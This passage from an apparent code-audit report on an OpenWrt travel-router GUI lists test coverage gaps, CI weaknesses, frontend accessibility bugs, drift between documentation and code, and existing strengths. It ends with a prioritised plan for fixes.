    JWT signing secret.
  - `ws/handler.go` — **0 %** (22 stmts). The only WebSocket authentication gate.
- **Other gaps:** `api/captive_handlers.go` 8.7 %, `api/adguard_handlers.go` 10.1 %,
  `api/sqm_handlers.go` 17.6 %, `api/usb_tethering_handlers.go` 20.0 %,
  `api/failover_handlers.go` 21.4 %, `ubus/real.go` 23.5 %,
  `services/captive_autoaccept.go` 31.3 %, `auth/ip_allowlist.go` middleware 0 %,
  `models/wifi.go` 0 %.
- **No OpenAPI drift test.** 64 of 165 registered operations are missing from
  `openapi_handler.go`, including `/adguard/dns-mode` and `/wifi/health` — the two
  contract endpoints named in ADR 0001 §2.4 and `architecture.md` §2.4. Two spec entries
  are also *wrong*: `/adguard/config` documents `{config}` while the handler uses
  `{"content": …}`, and `/auth/login` lists a `username` field that
  `models.LoginRequest` does not have (`Login` hard-codes `"root"`, `auth.go:120`).
- **`setupTestApp` leaks and can write to `/`.** `api/auth_handlers_test.go:28` uses
  `os.MkdirTemp` with no cleanup, called 103 times; if `MkdirTemp` ever fails, `tmpDir == ""`
  and every derived path becomes an absolute root path. Same at `cmd/server/main_test.go:83`.
- **Dead test.** `auth/ratelimit_test.go:9-22` — `TestRateLimiter_AllowsUnderLimit` builds
  a limiter and asserts nothing; the comment shows the approach was changed mid-author.
- **Flake sources:** 26 wall-clock sleeps (`ratelimit_test.go:70` sleeps 60 ms for a 50 ms
  window; `:81` sleeps 20 ms for 10 ms).
- **`-race` is 104 s in `internal/api`** because `auth_handlers_test.go:22` calls
  `auth.NewAuthService("admin", …)` per test and `auth.go:63-64` runs
  `bcrypt.DefaultCost` each time. `auth.NewAuthServiceWithHash` (`auth.go:71`) exists and
  is 0 %-covered.
- **White-box assertions** on unexported state: `ratelimit_test.go:84-85,100-101`,
  `ws/hub_test.go:73,83,90,114,120`, `alert_service_test.go:25,266,272`.
- **`shared/src/__tests__/routes.test.ts:25-30`** asserts `unique.size === routes.length - 1`,
  encoding "exactly one incidental duplicate exists" without naming it.
- **`--passWithNoTests`** in `frontend/package.json:11` can hide broken test discovery
  (53 test files exist today).
- **TS-side test quality:** `components/ui/__tests__/card.test.tsx:15` asserts
  `text-gray-900` exists, i.e. the test *enforces* the theming rule `AGENTS.md` forbids.
  `mocks/handlers.ts` returns HTTP 200 for all 151 handlers, so no `onError` path is
  exercised anywhere.

### CI / tooling

- `go test -race` is `workflow_dispatch`-only (`race-detector.yml:3-4`).
- CI never verifies the OpenWrt `arm64` cross-compile or `package-tarball.sh` layout
  (`ci.yml:135-136` builds host `linux/amd64` only).
- No `format:check` gate, and 28 source files currently fail it.
- `go mod tidy` mutates instead of verifying (`ci.yml:30-32`, `race-detector.yml:24-26`).
  Use `go mod tidy -diff`.
- No coverage report or gate on either the Go or TS side.
- No `shellcheck`; the 10 `scripts/*.sh` perform safety-critical device mutations and are
  neither linted nor exercised in CI. `shellcheck` is not in `.mise.toml`.
- `test/integration/*.sh` (620 lines) has no `make` target and cannot run in CI.
- `build-check` does not `needs: lint` (`ci.yml:106`).
- `make test` lacks `-count=1` (`Makefile:31`), so local runs can report cached results.
- `frontend/package.json:8` runs `tsc --noEmit` over `src/**/__tests__/**`, so a test
  type error fails the release build.
- Renovate does not cover the `golangci-lint` version (hardcoded in three places), the
  mise `goimports` pin, or Node; `osvVulnerabilityAlerts` is not enabled.
- `msw init public --save` postinstall rewrites a committed
  `frontend/public/mockServiceWorker.js` on every install.
- **Good:** all 11 Actions are SHA-pinned with `# vX` comments, `permissions: {}` at
  workflow level with per-job narrowing, `persist-credentials: false`, concurrency groups,
  and a `zizmor` supply-chain gate. `pnpm-lock.yaml` and `go.sum` are committed; all
  workflows use `--frozen-lockfile`.

### Frontend, non-P1

- **53 uses of `text-gray-400` with no `dark:` variant** (e.g.
  `components/wifi/wifi-qr-dialog.tsx:41`, `components/wifi/captive-portal-card.tsx:161`,
  `components/clients/client-row.tsx:38`,
  `pages/network/interface-traffic-chart-card.tsx:28,31,50,56,57`,
  `pages/setup/setup-wifi-network-list.tsx:68,69,74`,
  `pages/vpn/split-tunnel-card.tsx:102`). `#9ca3af` on white is 2.54:1 — fails WCAG AA
  1.4.3. The other 299 uses pair correctly.
- **`dashboard-page.tsx:47-49, 299, 337, 370, 400`** hardcodes a dark palette
  (`bg-slate-900`, `border-slate-700`, `text-slate-200`) with no light variant, in an
  otherwise light-themed app.
- **`pages/network/interface-traffic-chart-card.tsx:39-82`** hardcodes `#3b82f6`, `#f59e0b`,
  `#9ca3af`, `rgba(0,0,0,0.8)`, `#fff` instead of the `--chart-*` tokens already defined
  in `index.css:40-51` and used correctly by `pages/dashboard/network-chart.tsx:49-66`.
- **8 icon-only buttons with no accessible name** (WCAG 4.1.2):
  `components/clients/client-alias-cell.tsx:93,102`,
  `pages/clients/clients-search-bar.tsx:21`,
  `pages/network/data-usage-section.tsx:61`,
  `pages/network/dhcp-reservations-table.tsx:39`,
  `pages/network/dns-entries-card.tsx:67`,
  `pages/network/firewall-port-forward-rules-table.tsx:38`,
  `pages/wifi/mac-policy-table.tsx:34`. `client-row.tsx:73-110` and `dialog.tsx:49` do it
  correctly, so this is inconsistency rather than house style.
- **`components/clients/client-alias-cell.tsx:27, 129`** — the edit button is
  `opacity-0 group-hover:opacity-100`, so it is focusable but invisible to keyboard users
  (WCAG 2.4.7). No `group-focus-within:` or `focus-visible:` variant.
- **`components/layout/header-overflow-menu.tsx:37-84`** and
  `header-notifications-menu.tsx:14-52` are hand-rolled popovers with no `role`,
  `aria-expanded`, Escape handling, focus move/return, or roving tabindex. Dismissal is
  `mousedown`-only, so there is no keyboard dismissal path (WCAG 2.1.1 / 4.1.2).
  Radix primitives are already vendored.
- **`header-overflow-menu.tsx:100, 122`** closes the confirm dialog before the mutation
  resolves, so `isPending` renders into an unmounted component.
- `lib/api-client.ts:40-42` sets `Content-Type: application/json` on bodyless GETs.
- `components/wifi/captive-portal-card.tsx:33-41` — the notification-clearing condition
  is effectively unreachable, so a re-detected identical portal URL never re-toasts.
- `components/wifi/captive-portal-card.tsx:54-77` — effect deps include unstable
  `useMutation` result objects, so it re-runs every render.
- `hooks/use-session-timeout.ts:64-68` — `warnedRef` is never reset, so a re-issued
  session can never warn again.
- Inconsistent mutation feedback: `useCompleteSetup` (`use-system.ts:408-416`) and
  `useTailscaleAuth` (`use-vpn.ts:213-224`) have no `onError` toast; `useSetBandSwitching`,
  `useSetRepeaterOptions`, `useSetMACPolicies` have no success toast.
- **Oversized files:** `use-network.ts` (495), `use-wifi.ts` (442), `use-system.ts` (442) are
  flat lists of 25-40 single-use query/mutation pairs with byte-identical boilerplate —
  a `createMutation({ queryKey, path, successMsg })` factory would remove ~40 % and make
  the missing-`onError` class structurally impossible. `dashboard-page.tsx` (540) contains
  4 sub-components and two copy-pasted client-count blocks (`:141-155`, `:265-278`).
  `mocks/handlers.ts` (824) and `mocks/data.ts` (731) are fine as fixtures.
- No orphaned modules (script-scanned every `.ts` for zero external references).
- No `dangerouslySetInnerHTML`, `eval` or `innerHTML` anywhere. No hardcoded
  `/api/v1/...` strings outside `shared/src`; `API_ROUTES` covers 122 paths and
  `mocks/handlers.ts` mocks all 122.
- **Good test:** `hooks/__tests__/use-system-stats.test.tsx` asserts the WS push reaches
  the cache, that no extra HTTP fetch fired, and both `statsRefetchInterval` branches. It is
  the template — there is no equivalent for `use-topology-data`, which is why the
  `NetworkInterface.type` bug is undetected.

### Docs ↔ code drift

- **`deploy-local.sh:175` clears the wrong guards.** It removes
  `/etc/travo/ap-health-in-progress` — which **no Go code ever writes or reads** — and
  `autoreconnect-crash-guard`, but never `failover-in-progress`
  (`failover_service.go:23`), `band-switch-in-progress` (`band_switching_service.go:21`) or
  `captive-dns-in-progress` (`captive_service.go:24`). The documented recovery path
  (`architecture.md` §4 step 4, §6.2, ADR 0003 §1.4) does not exist for the three guards
  that actually matter; a stuck guard permanently disables failover or band switching.
- **ADR 0007 §4 is stale** — it lists "blocklist persistence" as remaining work; it shipped
  (`auth/blocklist_persist_test.go:24`, `NewTokenBlocklistWithStore`) and the plan marks it
  done. §5 also omits `/etc/travo/travo.db`.
- **ADR 0003 §2 guard table** omits `autoreconnect-crash-guard` and
  `autoreconnect-failcount` (`wifi_reconnect.go:64,75-80`).
- **ADR 0007 §2a's `BuildTime` gate is not what ships** — see the release finding above.
- **ADR 0003 §1.2 vs `failover_service.go:102-109`** — the guard-present skip is silent;
  the file contains no `log.` calls, while the ADR says "log a warning".
- **Startup AP repair commits `wireless` with no guard** (`main.go:210-218` →
  `ap_health.go:91`). The "no apply on startup" reasoning exists only in a code comment.
- **Undocumented `wifi up`/`wifi down` exception** in the button hotplug script
  (`system_service.go:712-717`) — a user toggle, not bounded recovery.
- **Undocumented shell-out exception:** `network_event_watcher.go:66` uses
  `exec.Command("iw", "event")`, while `architecture.md` §8 says fire-and-forget paths
  ending in reboot/poweroff/flash are the only exception.
- **`architecture.md` §8** claims every background goroutine registers in
  `appLifecycle`; `main.go:210,228,237` and `captive_service.go:129` do not.
- **Firewall mutations outside apply/confirm:** `vpn_service.go:772-800` and
  `usb_tethering_service.go:165-170` use direct `uci commit firewall` + reload with no
  guard and no `UCIApplyConfirm`; ADR 0004 §2's zone/interface inventory predates them.
- **Two undocumented normative subsystems, both needing an ADR:**
  - **SSH key management** (`system_service.go:804-864`, routes `router.go:84-86`) — an API
    that grants root SSH access, with only a non-empty check, no ADR and no OpenAPI entry.
  - **The bbolt store at `/etc/travo/travo.db`** (`store/store.go:1-10`) with a NAND
    overlayfs flash-write discipline, memory-only degradation on open failure
    (`main.go:146-152`), holding token revocations and stats history. `architecture.md` §8
    ("Device Constraints") is silent on persistent state.
  - Lower priority: SQM (`sqm_service.go`) and WireGuard multi-profile management
    (`vpn_service.go:82-94`) also have no ADR; ADR 0004 §2 still describes a single `wg0`.
- **`tasks_open.md` contradicts shipped code:** §2.7 lists four failover items as open that
  are implemented (ADR 0005 Accepted, `failover_service.go`, routes, OpenAPI) and already in
  `tasks_done.md`; §16 asks whether SQLite is a better fit — decided and implemented as
  bbolt with a measured rationale; §6.2 asks for historical data that ships as a 6 h ring
  buffer.
- **Hygiene:** `AGENTS.md` and `CLAUDE.md` are byte-identical; `README.md`'s command table
  misdescribes `make lint` ("go vet") and `make format` ("gofmt"); `CONTRIBUTING.md` clones
  `openwrt-travel-gui.git` and prescribes `pnpm install` + `go mod tidy` instead of
  `make install`; `tasks_open.md` / `tasks_done.md` carry two competing "last updated"
  markers. No dead relative links anywhere in `docs/`.

---

## What is already solid

Worth recording, because it is a real quality baseline and narrows where to spend effort:

- `uci.RealUCI` validates every config/section/option against `^[a-zA-Z0-9_]+$` and uses
  **argv slices with no shell** (`uci/real.go:27-31, 62-94`). This closes the usual Go
  command-injection class — the crontab/hotplug findings above are the exceptions where
  strings are *formatted into a file*, not passed to a shell.
- `ServiceManager.findDef` (`service_manager.go:396-403`) is a strict allowlist over a
  static package catalog, so `:id` cannot reach an arbitrary package.
- All 11 GitHub Actions are SHA-pinned with version comments; `permissions: {}` plus
  per-job narrowing; `persist-credentials: false`; concurrency groups; a `zizmor` gate.
- Every service-layer shell-out goes through `execx` with explicit timeout tiers and
  `cmd.WaitDelay` (the four exceptions in `system_service.go` are the gap).
- `TokenBlocklist` stores only `sha256(token)`, never raw tokens, and persists across
  restarts.
- `SessionRegistry`, `TokenBlocklist` and `RateLimiter` are correctly mutex-guarded with
  bounded maps and periodic sweeps.
- Alert and network-status channels use non-blocking sends, so shutdown cannot deadlock on
  a full channel.
- `parseLogOutput` uses `strings.Contains` rather than a compiled regex, so the
  user-supplied `service`/`level` params cannot cause ReDoS.
- No secrets appear in any `log.Printf` call.
- Login rate limiting, WS upgrade authentication, and the wireless
  `StartApply` → verify → `Confirm` + 30 s rollback window are correctly implemented.
- ADR 0001 / 0002 / 0003 / 0005 claims verified against code: `family: ipv4`
  (`failover_service.go:584,604`), `travo_` section prefix, 30 s hold-down, atomic
  reconcile before apply (`wifi_connect.go:122`, `wifi_scan.go:299`, `wifi_ap.go:289`,
  `wifi_repeater.go:280`), DNS snapshot/bypass paths, and the single `PackageManager`
  abstraction that names `apk`/`opkg`.

---

## Suggested order of work

1. **Pin Go 1.27.0** (`.mise.toml` + a `toolchain` directive in `backend/go.mod`) —
   unblocks every local `make` target.
2. **P0.1 + P0.2** — one shared `validateHHMM` at the handler *and* service boundary, plus
   a `[A-Za-z0-9_-]` allowlist on `HardwareButton.Name`. Small, self-contained, same
   validation boundary; good as one commit.
3. **P0.3** — clamp the time-sync target window; make the "clock was plausible" flag sticky.
4. **P0.4 + the P1 wireless/service items** — move the schedule and button toggle onto the
   staged apply/confirm path, or document them as explicit exceptions in
   `architecture.md` §3 and ADR 0002 §6; fix `SetRadioRole` commit ordering; return the
   `GetSections` error; add the missing `UCIApplyConfirm`/guard coverage to
   `RestoreBackup`/`UpgradeFirmware`/`FactoryReset`.
5. **Test gates that unblock the rest** — cover `uci_apply.go`, `file_store.go`,
   `ws/handler.go`, `band_switching_service.go`; add the OpenAPI route-drift test; switch
   `go mod tidy` to `-diff`; run `pnpm format --write` once then gate on
   `format:check`; swap the per-test bcrypt for `NewAuthServiceWithHash` so `-race` is
   cheap enough to run on every PR.
6. **Release safety** — `needs: [ci]` on `build-and-release`, stamp `BuildTime`, repair or
   delete `packaging/openwrt/Makefile`, and clean `VERSION` in `build.sh`.
7. **Frontend** — connect the WS on login → then `staleTime: Infinity` → then logout
   revocation → then the `NetworkInterface.type` fix with a real-shaped fixture and a
   `use-topology-data` test.
8. **Docs** — add ADRs for SSH key management and the bbolt store; fix the
   `deploy-local.sh` guard list; refresh ADR 0003 §2 and ADR 0007 §4/§5; close the
   contradicted `tasks_open.md` items; reduce `CLAUDE.md` to a pointer at `AGENTS.md`.
